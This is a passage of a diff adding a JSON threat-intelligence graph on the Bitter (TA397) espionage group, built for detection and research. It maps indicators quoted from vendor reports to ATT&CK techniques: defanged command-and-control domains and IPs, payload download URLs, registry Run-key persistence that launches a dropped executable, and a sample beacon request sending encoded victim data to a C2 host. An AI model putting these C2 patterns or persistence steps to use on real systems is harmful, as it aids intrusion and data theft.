+      },
+      {
+        "node_id": "IOC_ea1c4856a8c8",
+        "node_class": "ioc",
+        "node_type": "IPAddress",
+        "node_text": "99[.]83[.]154[.]118",
+        "edges": [
+          "EDGE_994d21c1b185"
+        ],
+        "source": {
+          "99[.]83[.]154[.]118_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": [
+            [
+              19,
+              "The C2 domain resolved to 99[.]83[.]154[.]118 during the period of the campaign."
+            ],
+            [
+              23,
+              "The 99[.]83[.]154[.]118 IP also hosts mswsceventlog[.]net, according to Cisco Umbrella, a domain that was previously reported as Bitter's C2 server in a campaign against Pakistani government organizations."
+            ]
+          ]
+        },
+        "raw_value": "99[.]83[.]154[.]118",
+        "canonical_value": "99[.]83[.]154[.]118"
+      },
+      {
+        "node_id": "IOC_035560702793",
+        "node_class": "ioc",
+        "node_type": "RegistryKey",
+        "node_text": "HKCU\\Environment\\AppId",
+        "edges": [
+          "EDGE_a561e3647032",
+          "EDGE_ad201fb937ce"
+        ],
+        "source": {
+          "HKCU\\Environment\\AppId_unit42.paloaltonetworks.com_multiple-artradownloader-variants-used-by-bitter-to-target-pakistan": [
+            [
+              29,
+              "It creates the following registry if it doesn’t already exist with the intent of persisting on the victim machine:\nHKCU\\Environment\\AppId – c:\\intel\\msdtcv.exe\nArtraDownloader then sets the following registry key to ensure that the malware executes across reboots."
+            ]
+          ]
+        },
+        "raw_value": "HKCU\\Environment\\AppId",
+        "canonical_value": "HKCU\\Environment\\AppId",
+        "normalized_value": "HKCU\\Environment\\AppId"
+      },
+      {
+        "node_id": "IOC_03a7a8da624c",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "xiovo426[.]net",
+        "edges": [
+          "EDGE_01e40a1561c2"
+        ],
+        "source": {
+          "xiovo426[.]net_unit42.paloaltonetworks.com_multiple-artradownloader-variants-used-by-bitter-to-target-pakistan": [
+            [
+              13,
+              "The other two files hosted on the engineering company’s domain communicated with command and control domain xiovo426[.]net."
+            ]
+          ]
+        },
+        "raw_value": "xiovo426[.]net",
+        "canonical_value": "xiovo426.net",
+        "normalized_value": "xiovo426.net"
+      },
+      {
+        "node_id": "IOC_1b66dc1557d4",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "frameworksupport[.]net",
+        "edges": [
+          "EDGE_ac4ee58e64c1"
+        ],
+        "source": {
+          "frameworksupport[.]net_unit42.paloaltonetworks.com_multiple-artradownloader-variants-used-by-bitter-to-target-pakistan": [
+            [
+              33,
+              "The following example GET request is made to the remote C2 server:\nGET /ourtyaz/qwe.php?TIe=214cf8g5.cgc9.51gb.914d.f17ceg%3ae4cc7*XJO.82GO2QF2BU9*%3aACme%3b%217%2f2%2f8712%21Tfswjdf%21Qbdl%212 HTTP/1.1\nHost: frameworksupport[.]net\nConnection: close\nIn the example request above, the data supplied in the TIe GET variable is separated by a * and the remaining data is encoded by adding one to each byte."
+            ]
+          ]
+        },
+        "raw_value": "frameworksupport[.]net",
+        "canonical_value": "frameworksupport.net",
+        "normalized_value": "frameworksupport.net"
+      },
+      {
+        "node_id": "IOC_2ba1432a90dd",
+        "node_class": "ioc",
+        "node_type": "Hash",
+        "node_text": "ef0cb0a1…",
+        "edges": [
+          "EDGE_69c1043336d0"
+        ],
+        "source": {
+          "ef0cb0a1…_unit42.paloaltonetworks.com_multiple-artradownloader-variants-used-by-bitter-to-target-pakistan": [
+            [
+              14,
+              "On December 17 and 18 2018, a file was downloaded from http://fst.gov[.]pk/images/winsvc (SHA256: ef0cb0a1…) after a user accessed the document cocktail and the dinner in the last week of dec.doc."
+            ]
+          ]
+        },
+        "raw_value": "ef0cb0a1…",
+        "canonical_value": "ef0cb0a1…"
+      },
+      {
+        "node_id": "IOC_4974e332a548",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "http://rmmun.org[.]pk/svch",
+        "edges": [
+          "EDGE_ed1d88571042"
+        ],
+        "source": {
+          "http://rmmun.org[.]pk/svch_unit42.paloaltonetworks.com_multiple-artradownloader-variants-used-by-bitter-to-target-pakistan": [
+            [
+              9,
+              "Beginning on Nov 6, 2018, the URL http://rmmun.org[.]pk/svch was observed hosting two ArtraDownloader files that communicated with the domains info.viewworld71[.]com or hewle.kielsoservice[.]net."
+            ]
+          ]
+        },
+        "raw_value": "http://rmmun.org[.]pk/svch",
+        "canonical_value": "http://rmmun.org.pk/svch",
+        "normalized_value": "http://rmmun.org.pk/svch"
+      },
+      {
+        "node_id": "IOC_50b98ed96b0d",
+        "node_class": "ioc",
+        "node_type": "RegistryKey",
+        "node_text": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+        "edges": [
+          "EDGE_469212dfb032",
+          "EDGE_eb0d34dbd9bb"
+        ],
+        "source": {
+          "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run_unit42.paloaltonetworks.com_multiple-artradownloader-variants-used-by-bitter-to-target-pakistan": [
+            [
+              30,
+              "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run – cmd /c start %AppId% && exit\nAdditionally, in a separate thread, the malware will spawn a new process to copy itself to the C:\\intel\\msdtcv.exe path."
+            ]
+          ]
+        },
+        "raw_value": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+        "canonical_value": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+        "normalized_value": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+      },
+      {
+        "node_id": "IOC_5ff64d829519",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "C:\\regdl.exe",
+        "edges": [
+          "EDGE_db83eef9cda6"
+        ],
+        "source": {
+          "C:\\regdl.exe_unit42.paloaltonetworks.com_multiple-artradownloader-variants-used-by-bitter-to-target-pakistan": [
+            [
+              42,
+              "As an example, should this malware originally be executed from C:\\, the downloaded file would be written to C:\\regdl.exe."
+            ]
+          ]
+        },
+        "raw_value": "C:\\regdl.exe",
+        "canonical_value": "C:\\regdl.exe",
+        "normalized_value": "C:\\regdl.exe"
+      },
+      {
+        "node_id": "IOC_7549eadcd1d4",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "http://fst.gov[.]pk/images/winsvc",
+        "edges": [
+          "EDGE_065e7814fa75"
+        ],
+        "source": {
+          "http://fst.gov[.]pk/images/winsvc_unit42.paloaltonetworks.com_multiple-artradownloader-variants-used-by-bitter-to-target-pakistan": [
+            [
+              14,
+              "On December 17 and 18 2018, a file was downloaded from http://fst.gov[.]pk/images/winsvc (SHA256: ef0cb0a1…) after a user accessed the document cocktail and the dinner in the last week of dec.doc."
+            ]
+          ]
+        },
+        "raw_value": "http://fst.gov[.]pk/images/winsvc",
+        "canonical_value": "http://fst.gov.pk/images/winsvc",
+        "normalized_value": "http://fst.gov.pk/images/winsvc"
+      },
+      {
+        "node_id": "IOC_8b88e869c241",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "hewle.kielsoservice[.]net",
+        "edges": [
+          "EDGE_d99f273dc993"
+        ],
+        "source": {
+          "hewle.kielsoservice[.]net_unit42.paloaltonetworks.com_multiple-artradownloader-variants-used-by-bitter-to-target-pakistan": [
+            [
+              9,
+              "Beginning on Nov 6, 2018, the URL http://rmmun.org[.]pk/svch was observed hosting two ArtraDownloader files that communicated with the domains info.viewworld71[.]com or hewle.kielsoservice[.]net."
+            ],
+            [
+              12,
+              "This file downloaded a payload that also communicated with the domain hewle.kielsoservice[.]net."
+            ],
+            [
+              17,
+              "In this case it was observed using the command and control domain of hewle.kielsoservice[.]net/Engset.php."
+            ]
+          ]
+        },
+        "raw_value": "hewle.kielsoservice[.]net",
+        "canonical_value": "hewle.kielsoservice.net",
+        "normalized_value": "hewle.kielsoservice.net"
+      },
+      {
+        "node_id": "IOC_9d6878e541d2",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "hewle.kielsoservice[.]net/Engset.php",
+        "edges": [
+          "EDGE_286d35d2237d"
+        ],
+        "source": {
+          "hewle.kielsoservice[.]net/Engset.php_unit42.paloaltonetworks.com_multiple-artradownloader-variants-used-by-bitter-to-target-pakistan": [
+            [
+              17,
+              "In this case it was observed using the command and control domain of hewle.kielsoservice[.]net/Engset.php."
+            ]
+          ]
+        },
+        "raw_value": "hewle.kielsoservice[.]net/Engset.php",
+        "canonical_value": "http://hewle.kielsoservice.net/Engset.php",
+        "normalized_value": "http://hewle.kielsoservice.net/Engset.php"
+      },
+      {
+        "node_id": "IOC_af0f9af7685e",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "zmwardrobe[.]com",
+        "edges": [
+          "EDGE_ce624a1ad635"
+        ],
+        "source": {
+          "zmwardrobe[.]com_unit42.paloaltonetworks.com_multiple-artradownloader-variants-used-by-bitter-to-target-pakistan": [
+            [
+              23,
+              "In November 2017 we reported on malicious documents that were downloaded from the domain zmwardrobe[.]com and subsequently executed a payload referred to as MY24."
+            ]
+          ]
+        },
+        "raw_value": "zmwardrobe[.]com",
+        "canonical_value": "zmwardrobe.com",
+        "normalized_value": "zmwardrobe.com"
+      },
+      {
+        "node_id": "IOC_afe220cbcea6",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "C:\\intel\\",
+        "edges": [],
+        "source": {
+          "C:\\intel\\_unit42.paloaltonetworks.com_multiple-artradownloader-variants-used-by-bitter-to-target-pakistan": [
+            [
+              28,
+              "It proceeds to attempt to create the C:\\intel\\ directory, which is where various files will eventually be stored."
+            ]
+          ]
+        },
+        "raw_value": "C:\\intel\\",
+        "canonical_value": "C:\\intel",
+        "normalized_value": "C:\\intel"
+      },
+      {
+        "node_id": "IOC_b1ec5987a5ea",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "almasoodgroup[.]com",
+        "edges": [],
+        "source": {
+          "almasoodgroup[.]com_unit42.paloaltonetworks.com_multiple-artradownloader-variants-used-by-bitter-to-target-pakistan": [
+            [
+              10,
+              "Between November 2018 and January 2019, an engineering and hydraulics company in Pakistan, almasoodgroup[.]com was observed hosting two AtraDownloader executables as well as a malicious document used to deliver a payload."
+            ]
+          ]
+        },
+        "raw_value": "almasoodgroup[.]com",
+        "canonical_value": "almasoodgroup.com",
+        "normalized_value": "almasoodgroup.com"
+      },
+      {
+        "node_id": "IOC_bc25f1d194af",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "c:\\intel\\msdtcv.exe",
+        "edges": [
+          "EDGE_c1829d996e8d"
+        ],
+        "source": {
+          "c:\\intel\\msdtcv.exe_unit42.paloaltonetworks.com_multiple-artradownloader-variants-used-by-bitter-to-target-pakistan": [
+            [
+              29,
+              "It creates the following registry if it doesn’t already exist with the intent of persisting on the victim machine:\nHKCU\\Environment\\AppId – c:\\intel\\msdtcv.exe\nArtraDownloader then sets the following registry key to ensure that the malware executes across reboots."
+            ]
+          ]
+        },
+        "raw_value": "c:\\intel\\msdtcv.exe",
+        "canonical_value": "C:\\intel\\msdtcv.exe",
+        "normalized_value": "C:\\intel\\msdtcv.exe"
+      },
+      {
+        "node_id": "IOC_c6fef7253362",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "info.viewworld71[.]com",
+        "edges": [
+          "EDGE_77835f43b485"
+        ],
+        "source": {
+          "info.viewworld71[.]com_unit42.paloaltonetworks.com_multiple-artradownloader-variants-used-by-bitter-to-target-pakistan": [
+            [
+              9,
+              "Beginning on Nov 6, 2018, the URL http://rmmun.org[.]pk/svch was observed hosting two ArtraDownloader files that communicated with the domains info.viewworld71[.]com or hewle.kielsoservice[.]net."
+            ]
+          ]
+        },
+        "raw_value": "info.viewworld71[.]com",
+        "canonical_value": "info.viewworld71.com",
+        "normalized_value": "info.viewworld71.com"
+      },
+      {
+        "node_id": "IOC_171802a4c87f",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "woodstocktutors[.]com",
+        "edges": [
+          "EDGE_622072d95361",
+          "EDGE_995d9873a7e6",
+          "EDGE_cd00c57dba9b"
+        ],
+        "source": {
+          "woodstocktutors[.]com_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": [
+            [
+              31,
+              "The following example of a scheduled task command line shows how the task beaconed every 16 minutes to the staging domain woodstocktutors[.]com, awaiting instructions to retrieve the next-stage payload."
+            ]
+          ]
+        },
+        "raw_value": "woodstocktutors[.]com",
+        "canonical_value": "woodstocktutors.com",
+        "normalized_value": "woodstocktutors.com"
+      },
+      {
+        "node_id": "IOC_34717c71c4be",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "hxxp://173.254.204[.]72/dune64.log",
+        "edges": [
+          "EDGE_c3e655cafcad"
+        ],
+        "source": {
+          "hxxp://173.254.204[.]72/dune64.log_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": [
+            [
+              35,
+              "In this case, TA397 operators made an error by issuing a curl command that attempted to retrieve a payload from:\nhxxp://173.254.204[.]72/dune64.log\nHowever, this request returned a 404 error as the attackers had not placed a file with that name on their server – making the rename command and the execution of shh.exe fail."
+            ]
+          ]
+        },
+        "raw_value": "hxxp://173.254.204[.]72/dune64.log",
+        "canonical_value": "http://173.254.204.72/dune64.log",
+        "normalized_value": "http://173.254.204.72/dune64.log"
+      },
+      {
+        "node_id": "IOC_3a2f2f0c18c2",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "163[.]com",
+        "edges": [
+          "EDGE_fbebc51b9d97"
+        ],
+        "source": {
+          "163[.]com_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": [
+            [
+              14,
+              "The group has shifted between freemail providers – 163[.]com, 126[.]com, and ProtonMail – and various compromised accounts belonging to the governments of Pakistan, Bangladesh, and Madagascar."
+            ]
+          ]
+        },
+        "raw_value": "163[.]com",
+        "canonical_value": "163.com",
+        "normalized_value": "163.com"
+      },
+      {
+        "node_id": "IOC_445d7f050b54",
+        "node_class": "ioc",
+        "node_type": "IPAddress",
+        "node_text": "72.18.215[.]108",
+        "edges": [
+          "EDGE_43c2e859bdd3"
+        ],
+        "source": {
+          "72.18.215[.]108_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": [
+            [
+              39,
+              "This variant was found to be communicating with 72.18.215[.]108 over port 443."
+            ]
+          ]
+        },
+        "raw_value": "72.18.215[.]108",
+        "canonical_value": "72.18.215[.]108"
+      },
+      {
+        "node_id": "IOC_790a81f8590f",
+        "node_class": "ioc",
+        "node_type": "CVE",
+        "node_text": "CVE-2024-43572",
+        "edges": [
+          "EDGE_74c70077a235"
+        ],
+        "source": {
+          "CVE-2024-43572_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": [
+            [
+              30,
+              "In this campaign, TA397 exploited CVE-2024-43572, otherwise known as GrimResource, which is a vulnerability that provides attackers remote code execution in the context of mmc.exe on targeted endpoints."
+            ]
+          ]
+        },
+        "raw_value": "CVE-2024-43572",
+        "canonical_value": "CVE-2024-43572",
+        "normalized_value": "CVE-2024-43572"
+      },
+      {
+        "node_id": "IOC_cd4d415ced77",
+        "node_class": "ioc",
+        "node_type": "IPAddress",
+        "node_text": "173.254.204[.]72",
+        "edges": [
+          "EDGE_5fd5f258657a"
+        ],
+        "source": {
+          "173.254.204[.]72_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": [
+            [
+              35,
+              "In this case, TA397 operators made an error by issuing a curl command that attempted to retrieve a payload from:\nhxxp://173.254.204[.]72/dune64.log\nHowever, this request returned a 404 error as the attackers had not placed a file with that name on their server – making the rename command and the execution of shh.exe fail."
+            ]
+          ]
+        },
+        "raw_value": "173.254.204[.]72",
+        "canonical_value": "173.254.204[.]72"
+      },
+      {
+        "node_id": "IOC_ef4cdc14c9f2",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "126[.]com",
+        "edges": [
+          "EDGE_0540d0a634a0"
+        ],
+        "source": {
+          "126[.]com_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": [
+            [
+              14,
+              "The group has shifted between freemail providers – 163[.]com, 126[.]com, and ProtonMail – and various compromised accounts belonging to the governments of Pakistan, Bangladesh, and Madagascar."
+            ]
+          ]
+        },
+        "raw_value": "126[.]com",
+        "canonical_value": "126.com",
+        "normalized_value": "126.com"
+      }
+    ]
+  },
+  "edges": [
+    {
+      "edge_id": "EDGE_06e2f5bd0d8d",
+      "node_u": "HL_5827ab97cb13",
+      "node_v": "TTP_T1090",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_078f029bf19d",
+      "node_u": "HL_c6426a20d0e4",
+      "node_v": "TTP_T1105",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_09565894f2da",
+      "node_u": "IOC_549a99bb7374",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_126fc6326c89",
+      "node_u": "HL_5827ab97cb13",
+      "node_v": "TTP_T1566",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_18dfb78659e5",
+      "node_u": "HL_5827ab97cb13",
+      "node_v": "TTP_T1071",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_21fe45ddd4c1",
+      "node_u": "IOC_9c59c7073e89",
+      "node_v": "TTP_T1203",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_2247b2099edc",
+      "node_u": "HL_5827ab97cb13",
+      "node_v": "TTP_T1036",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_22cbea80133f",
+      "node_u": "HL_5827ab97cb13",
+      "node_v": "TTP_T1583",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_3ad865936259",
+      "node_u": "HL_5827ab97cb13",
+      "node_v": "TTP_T1059",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_59b4ebe5e532",
+      "node_u": "HL_5827ab97cb13",
+      "node_v": "TTP_T1105",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_5a679a1b915f",
+      "node_u": "HL_5827ab97cb13",
+      "node_v": "TTP_T1082",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_5bb8261f04ba",
+      "node_u": "HL_902acd266219",
+      "node_v": "TTP_T1566",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_66f0c36df320",
+      "node_u": "HL_ec3570bf1f6d",
+      "node_v": "TTP_T1203",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_68939b03b499",
+      "node_u": "HL_5827ab97cb13",
+      "node_v": "TTP_T1203",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_6d7260192d42",
+      "node_u": "IOC_792cf6811a35",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_7e201a7f015d",
+      "node_u": "HL_62951c4067f1",
+      "node_v": "TTP_T1203",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_8452aa4a911e",
+      "node_u": "IOC_a45ef11d47a2",
+      "node_v": "TTP_T1583",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_8dd387689786",
+      "node_u": "IOC_313335da0037",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_92b4d6bbbf09",
+      "node_u": "IOC_07dae82e2b75",
+      "node_v": "TTP_T1203",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_994d21c1b185",
+      "node_u": "IOC_ea1c4856a8c8",
+      "node_v": "TTP_T1583",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_aa1e8fdbf6ea",
+      "node_u": "IOC_c0062b94f744",
+      "node_v": "TTP_T1203",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_c6fa79b7c2f1",
+      "node_u": "IOC_56595d51e494",
+      "node_v": "TTP_T1203",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_d54f777ba570",
+      "node_u": "IOC_8162f3bcad5b",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_d595744fa952",
+      "node_u": "HL_d3e527a4d698",
+      "node_v": "TTP_T1566",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_e4a2879e3bec",
+      "node_u": "HL_51ab16719f15",
+      "node_v": "TTP_T1203",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_f0594fdbf1af",
+      "node_u": "HL_59d0f43e5b07",
+      "node_v": "TTP_T1090",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_fedf7b0396ad",
+      "node_u": "IOC_8d216c5c92cf",
+      "node_v": "TTP_T1583",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_0071032259a0",
+      "node_u": "HL_8793fb593279",
+      "node_v": "TTP_T1547",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_01e40a1561c2",
+      "node_u": "IOC_03a7a8da624c",
+      "node_v": "TTP_T1071",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_065e7814fa75",
+      "node_u": "IOC_7549eadcd1d4",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_286d35d2237d",
+      "node_u": "IOC_9d6878e541d2",
+      "node_v": "TTP_T1071",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_296bbe6f70fc",
+      "node_u": "HL_8793fb593279",
+      "node_v": "TTP_T1082",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_32a2042b6388",
+      "node_u": "HL_8793fb593279",
+      "node_v": "TTP_T1105",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_358bc61df97c",
+      "node_u": "HL_8793fb593279",
+      "node_v": "TTP_T1203",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_469212dfb032",
+      "node_u": "IOC_50b98ed96b0d",
+      "node_v": "TTP_T1547",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_69c1043336d0",
+      "node_u": "IOC_2ba1432a90dd",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_6e56e6a61a1d",
+      "node_u": "HL_3b520e7d5fd6",
+      "node_v": "TTP_T1105",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_77835f43b485",
+      "node_u": "IOC_c6fef7253362",
+      "node_v": "TTP_T1071",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_7cac4f03c7fa",
+      "node_u": "HL_8793fb593279",
+      "node_v": "TTP_T1112",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_a561e3647032",
+      "node_u": "IOC_035560702793",
+      "node_v": "TTP_T1547",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_ac4ee58e64c1",
+      "node_u": "IOC_1b66dc1557d4",
+      "node_v": "TTP_T1071",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_ad201fb937ce",
+      "node_u": "IOC_035560702793",
+      "node_v": "TTP_T1112",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_ba1eb2e151f6",
+      "node_u": "HL_8793fb593279",
+      "node_v": "TTP_T1204",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_c07997950918",
+      "node_u": "HL_8793fb593279",
+      "node_v": "TTP_T1071",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_c1829d996e8d",
+      "node_u": "IOC_bc25f1d194af",
+      "node_v": "TTP_T1547",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_cb14a8dceebf",
+      "node_u": "HL_8793fb593279",
+      "node_v": "TTP_T1059",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_ce624a1ad635",
+      "node_u": "IOC_af0f9af7685e",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_d8cf38e8bbb4",
+      "node_u": "HL_8793fb593279",
+      "node_v": "TTP_T1027",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_d99f273dc993",
+      "node_u": "IOC_8b88e869c241",
+      "node_v": "TTP_T1071",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_db83eef9cda6",
+      "node_u": "IOC_5ff64d829519",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_eb0d34dbd9bb",
+      "node_u": "IOC_50b98ed96b0d",
+      "node_v": "TTP_T1112",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_ed1d88571042",
+      "node_u": "IOC_4974e332a548",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_0540d0a634a0",
+      "node_u": "IOC_ef4cdc14c9f2",
+      "node_v": "TTP_T1586",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_0a8c60944aa0",
+      "node_u": "HL_5827ab97cb13",
+      "node_v": "TTP_T1078",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_1467211cd877",
+      "node_u": "HL_5827ab97cb13",
+      "node_v": "TTP_T1586",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_1b59d70a09cc",
+      "node_u": "HL_5827ab97cb13",
+      "node_v": "TTP_T1564",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_1fe79ec38b79",
+      "node_u": "HL_50ef26c8e6f5",
+      "node_v": "TTP_T1078",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_43c2e859bdd3",
+      "node_u": "IOC_445d7f050b54",
+      "node_v": "TTP_T1071",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_4b0a450bba11",
+      "node_u": "HL_727ff6c5d7e1",
+      "node_v": "TTP_T1071",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_5f92b5aafe1e",
+      "node_u": "HL_727ff6c5d7e1",
+      "node_v": "TTP_T1105",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_5fd5f258657a",
+      "node_u": "IOC_cd4d415ced77",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_5ff1b80cf3fc",
+      "node_u": "HL_5827ab97cb13",
+      "node_v": "TTP_T1204",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_622072d95361",
+      "node_u": "IOC_171802a4c87f",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_7087b6fde51f",
+      "node_u": "HL_5827ab97cb13",
+      "node_v": "TTP_T1053",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_74c70077a235",
+      "node_u": "IOC_790a81f8590f",
+      "node_v": "TTP_T1203",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_75b66e947eb2",
+      "node_u": "HL_37d5f6714279",
+      "node_v": "TTP_T1078",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_7efd945b2963",
+      "node_u": "HL_50ef26c8e6f5",
+      "node_v": "TTP_T1586",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_87be49dcbd21",
+      "node_u": "HL_727ff6c5d7e1",
+      "node_v": "TTP_T1132",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_995d9873a7e6",
+      "node_u": "IOC_171802a4c87f",
+      "node_v": "TTP_T1071",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_af8e6cee8033",
+      "node_u": "HL_cc9c0c761f31",
+      "node_v": "TTP_T1078",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_b29e315e3321",
+      "node_u": "HL_cc9c0c761f31",
+      "node_v": "TTP_T1586",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_b6c1f21f92f7",
+      "node_u": "HL_50ef26c8e6f5",
+      "node_v": "TTP_T1566",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_c3e655cafcad",
+      "node_u": "IOC_34717c71c4be",
+      "node_v": "TTP_T1105",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_ca1d67be25c4",
+      "node_u": "HL_37d5f6714279",
+      "node_v": "TTP_T1586",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_cd00c57dba9b",
+      "node_u": "IOC_171802a4c87f",
+      "node_v": "TTP_T1053",
+      "edge_type": "ioc-ttp"
+    },
+    {
+      "edge_id": "EDGE_d0528b141b90",
+      "node_u": "HL_50ef26c8e6f5",
